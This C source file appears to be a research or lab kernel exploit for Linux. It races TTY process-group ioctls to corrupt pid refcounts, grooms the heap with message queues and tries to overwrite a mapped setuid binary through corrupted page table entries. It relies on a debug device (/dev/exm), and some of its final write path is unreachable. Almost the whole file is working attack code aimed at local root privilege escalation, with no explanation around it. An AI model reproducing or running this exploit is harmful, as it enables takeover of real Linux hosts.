#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>

#define TAG "*EXP* "

#define fork() syscall(__NR_clone, CLONE_FILES | CLONE_FS | SIGCHLD, NULL, NULL, NULL, 0)

#include "exm.h"

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        err(1, "SYSCHK(" #x ")"); \
    __res;                        \
})

#define SOCKS_FOR_CREDS 100
#define CREDS_PER_SOCKET 100
#define SKEW_ATTEMPTS 50000

struct pty_pair {
    int ptmx;
    int tty;
};

struct expmsg_t {
    long type;
    char text[0];
};

struct sockaddr_un unix_addr = {
    .sun_family = AF_UNIX,
    .sun_path = "/tmp/exploitsocket"
};
int listensock;
int cred_socks[SOCKS_FOR_CREDS][2];
struct {
    int ptr;
} *data;
volatile int* syncptr;
int queue;

int exm = -1;

struct {
    pid_t pid;
    unsigned long pid_addr;
} exm_data;

void exm_chk_refcnt()
{
    int refcnt = ioctl(exm, IOC_PID_REFCNT, exm_data.pid_addr);
    printf("[PID] %d refcount = 0x%x (%d)\n", exm_data.pid, refcnt, refcnt);
}

void pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    int r = SYSCHK(sched_setaffinity(0, sizeof(cpuset), &cpuset));
}

void inc_pid(pid_t pid)
{
    uid_t uid = getuid();
    uid_t gid = getgid();
    for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
        for (int refs_held = 0; refs_held < CREDS_PER_SOCKET; refs_held++) {
            struct iovec iov = { .iov_base = "a", .iov_len = 1 };
            struct __attribute__((aligned(8))) {
                struct cmsghdr hdr;
                struct ucred ucred;
            } controldata = {
                .hdr = {
                    .cmsg_len = sizeof(struct cmsghdr) + sizeof(struct ucred),
                    .cmsg_level = SOL_SOCKET,
                    .cmsg_type = SCM_CREDENTIALS },
                .ucred = { .pid = pid, .uid = uid, .gid = gid }
            };
            struct msghdr hdr = {
                .msg_iov = &iov,
                .msg_iovlen = 1,
                .msg_control = &controldata,
                .msg_controllen = sizeof(controldata)
            };
            if (sockidx == 0) {
            }
            int ret = sendmsg(cred_socks[sockidx][0], &hdr, MSG_DONTWAIT);
            if (ret <= 0) {
                err(1, "sendmsg failed, CREDS_PER_SOCKET is probably too high");
                break;
            }
        }
    }
}

void do_dec_pid()
{
    for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
        for (int refs = 0; refs < CREDS_PER_SOCKET; refs++) {
            char dummy;
            if (read(cred_socks[sockidx][1], &dummy, 1) != 1)
                err(1, "read from sockpair_refhold failed with syscall return???");
        }
    }
}

void dec_pid(pid_t pid)
{
    int df_status;
    puts("dec_pid");
    *syncptr = 0;
    pid_t df_child = fork();
    if (df_child == -1)
        err(1, "fork");
    if (df_child == 0) {
        for (int sockidx = 0; sockidx < SOCKS_FOR_CREDS; sockidx++) {
            for (int refs = 0; refs < CREDS_PER_SOCKET; refs++) {
                char dummy;
                if (read(cred_socks[sockidx][1], &dummy, 1) != 1)
                    err(1, "read from sockpair_refhold failed with syscall return???");
                (*syncptr)++;
            }
        }
        errx(1, "unexpectedly all socket data was flushed out successfully?");
    }

    if (waitpid(df_child, &df_status, 0) != df_child)
        err(1, "waitpid");
    // if (!WIFSIGNALED(df_status))
    //     errx(1, "double-free child did not die due to signal?");
    printf("double-free child died with signal %d after dropping %d references (%d%%)\n",
        WTERMSIG(df_status), *syncptr,
        100 * (*syncptr) / (SOCKS_FOR_CREDS * CREDS_PER_SOCKET));
    puts("exit dec_pid");
}

pid_t trigger_bug(struct pty_pair pair, int do_trigger)
{
    puts("start trigger bug");
    pid_t parent = getpid();
    pid_t child = fork();
    if (child == 0) {
        SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
        printf("forked bug child\n");
        pin_cpu(1);
        child = getpid();

        /* create post-death-incrementable pid reference */
        SYSCHK(listen(listensock, 128 /*SOMAXCONN*/));

        SYSCHK(setpgid(0, 0));

        printf("start inc\n");
        inc_pid(child);
        printf("finish inc\n");

        if (!do_trigger) exit(0);

        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
            while (1) {
                char syncval = *syncptr;
                if ((syncval & 1) == 0) {
                    if (syncval == 10)
                        break;
                    *syncptr = syncval + 1;
                }
            }
            /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
            SYSCHK(ioctl(pair.tty, TIOCSPGRP, &parent));
            *syncptr = 11;
        }
        printf("bug child exit\n");
        exit(0);
    }

    exm_data.pid_addr = ioctl(exm, IOC_PID_ADDR, child);

    if (do_trigger) {
        for (int attempts = 0; attempts < SKEW_ATTEMPTS; attempts++) {
            /* update parent -> child (does not race) */
            SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &child));

            *syncptr = 0;
            while (1) {
                char syncval = *syncptr;
                if ((syncval & 1) == 1) {
                    *syncptr = syncval + 1;
                    /* at 9, we first bump to 10 so that the child can go ahead, then also go ahead ourselves */
                    if (syncval == 9)
                        break;
                }
            }

            /* update child -> parent (races, may leave child refcount too low and parent refcount too high) */
            SYSCHK(ioctl(pair.ptmx, TIOCSPGRP, &parent));

            while (*syncptr != 11) /*wait*/
                ;
        }
    }

    int status;
    if (waitpid(child, &status, 0) != child) {
        err(1, "wait for bug child");
    }

    puts("end trigger bug");
    return child;
}

struct pty_pair setup_tty()
{
    struct pty_pair pair;
    pid_t main_task = SYSCHK(fork());
    if (main_task != 0) {
        int status;
        if (waitpid(main_task, &status, 0) != main_task)
            err(1, "waitpid main_task");
        exit(0);
    }
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1)
        exit(0);

    printf("executing in first level child process, setting up session and PTY pair...\n");

    /* basic preparation */
    SYSCHK(signal(SIGTTOU, SIG_IGN));
    SYSCHK(setsid());

    /* set up a new pty pair */
    pair.ptmx = SYSCHK(open("/dev/ptmx", O_RDWR));
    unlockpt(pair.ptmx);
    pair.tty = SYSCHK(open(ptsname(pair.ptmx), O_RDWR));
    return pair;
}

void setup_data()
{
    data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    syncptr = &data->ptr;
    if ((void*)syncptr == MAP_FAILED)
        err(1, "mmap shared");

    listensock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
    unlink(unix_addr.sun_path);
    SYSCHK(bind(listensock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));

    for (int i = 0; i < SOCKS_FOR_CREDS; i++) {
        SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cred_socks[i]));
    }

    queue = SYSCHK(msgget(IPC_PRIVATE, 0600));

    exm = open("/dev/exm", O_RDWR);
    if (exm == -1) {
        perror("open /dev/exm");
    }
}

int la = 64;
int lb = 30;
int lc = 16;

void prepare_vmas(char* base, const char* suid_path)
{

    int suid_fd = SYSCHK(open(suid_path, O_RDONLY));
    if (mmap((void*)(base + 0x3ffff000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, suid_fd, 0) == MAP_FAILED)
        err(1, "mmap to materialize L2 table and above");
    *(volatile char*)(base + 0x3ffff000);
    for (int i = 0; i < la * lb; i++) {
        if (mmap((void*)(base + i * lc * 0x1000), 0x1000, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, suid_fd, 0) == MAP_FAILED)
            err(1, "mmap suid binary");
    }
}

long alloc_n(long n)
{
    static int total_s;
    int r;
    struct expmsg_t msg = {
        .type = n
    };
    r = msgsnd(queue, (void*)&msg, sizeof(msg.text), 0);
    if (++total_s % 1000 == 0)
        printf("sent %d (%lx)\n", total_s, n);
    if (r == -1) {
        err(1, "snd %lx", n);
    }
    return n;
}

void free_n(long n)
{
    static int total_r;
    int r;
    struct expmsg_t msg;
    r = msgrcv(queue, (void*)&msg, sizeof(msg), n, 0);
    if (r == -1) {
        err(1, "rcv %ld", n);
    }
    // if (++total_r % 20 == 0)
    //     printf("recv %d (%ld)\n", total_r, msg.type);
}

int seq_id = 1;

long fill_one_page()
{
    long si = seq_id++;
    for (int i = 0; i < 63; i++) {
        alloc_n(si);
    }
    return alloc_n(seq_id++);
}

int refsocks[1024];
int lsocks[1024];
int isock = 0;

pid_t add_to_refcount(int count, int listensock)
{
    *syncptr = 1;
    pid_t child = fork();
    if (child == 0) {
        for (int i = 0; i < count; i++) {
            int refsock = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0));
            SYSCHK(connect(refsock, (struct sockaddr*)&unix_addr, sizeof(unix_addr)));
            int lsock = SYSCHK(accept(listensock, NULL, NULL));
            close(lsock);
            refsocks[isock] = refsock;
            lsocks[isock] = lsock;
            isock++;
        }
        *syncptr = 0;
        pause();
    }
    while (*syncptr)
        ;
    return child;
}

void sub_from_refcount(int count, int listensock)
{
    for (int i = 0; i < count; i++) {
        isock--;
        if (isock < 0) {
            err(1, "sub below 0");
        }
        close(refsocks[isock]);
        close(lsocks[isock]);
    }
}

int do_write(const char* fake_path, char* base)
{
    int fake_fd = SYSCHK(open(fake_path, O_RDONLY));
    int size = 0x1000;

    printf("write size %u\n", size);
    for (int i = 0; i < la * lb; i++) {
        char* addr = (char*)(base + i * lc * 0x1000);
        if (i % 64 == 0)
            printf("write %p,%p..%p\n", addr, addr + lc * 0x1000, addr + 63 * lc * 0x1000);
        for (int j = 0; j < 2; j++) {
            int res = pread(fake_fd, addr, size, 0);
            if (res == -1) {
                if (errno != EFAULT)
                    perror("read into possibly-corrupted PTE failed");
                continue;
            }
            printf("clobber via corrupted PTE succeeded in page %d, 64-byte-allocation index %d, returned %d\n", i / 64, i % 64, res);
            return 0;
        }
    }
    puts("failed write");
    return -1;
}

int exploit()
{
    pid_t pid;
    setbuf(stdout, NULL);
    sync();

    printf("starting up...\n");

    pin_cpu(0);

    struct pty_pair pair = setup_tty();
    setup_data();

    const char* suid_path = "/sbin/suid";
    char* base = (char*)0x40000000;
    prepare_vmas(base, suid_path);

#define NUM_DRAIN_FDS 40
    long drain_fds[NUM_DRAIN_FDS];
    long seqfiles[1024];
    int i_seq;

    for (int i = 0; i < 50; i++) {
        fill_one_page();
    }

    for (int i = 0; i < NUM_DRAIN_FDS; i++)
        drain_fds[i] = fill_one_page();

    ioctl(exm, IOC_TRACE_MSG, 1);
    for (i_seq = 0; i_seq < 63; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }

    pid_t child = trigger_bug(pair, 1);

    for (; i_seq < 63 + 64 + 1; i_seq++) {
        seqfiles[i_seq] = alloc_n(seq_id++);
    }
    ioctl(exm, IOC_TRACE_MSG, 0);

    puts(TAG "wait RCU");
    ioctl(exm, IOC_WAIT_RCU, 1);
    puts(TAG "Done RCU");


    puts(TAG "start DEC");
    int status;
    child = fork();
    if (child == 0) {
        pin_cpu(1);
        do_dec_pid();
        exit(0);
    }
    if (waitpid(child, &status, 0) != child)
        err(1, "wait dec child");
    puts(TAG "end DEC");

    exm_chk_refcnt();

    puts(TAG "start drain");
    for (int i = 0; i < i_seq; i++) {
        free_n(seqfiles[i]);
    }
    puts(TAG "end drain");
    ioctl(exm, IOC_CHK_PAGE);

    for (int i = 0; i < NUM_DRAIN_FDS; i++) {
        free_n(drain_fds[i]);
    }

    for (int i = 0; i < la * lb; i++) {
        volatile char* addr = base + i * lc * 0x1000;
        *(volatile char*)addr;
        // ioctl(exm, IOC_PTE, addr);
    }

    puts("refs POST PTE:");
    exm_chk_refcnt();

    pause();
    exit(0);

    puts("refs after sub:");
    exm_chk_refcnt();

    exit(0);

    int r = do_write("/sbin/fake", base);

    puts("FINISH");

    while (1)
        pause();

    return 0;
}

int main()
{
    exploit();
    return 0;
}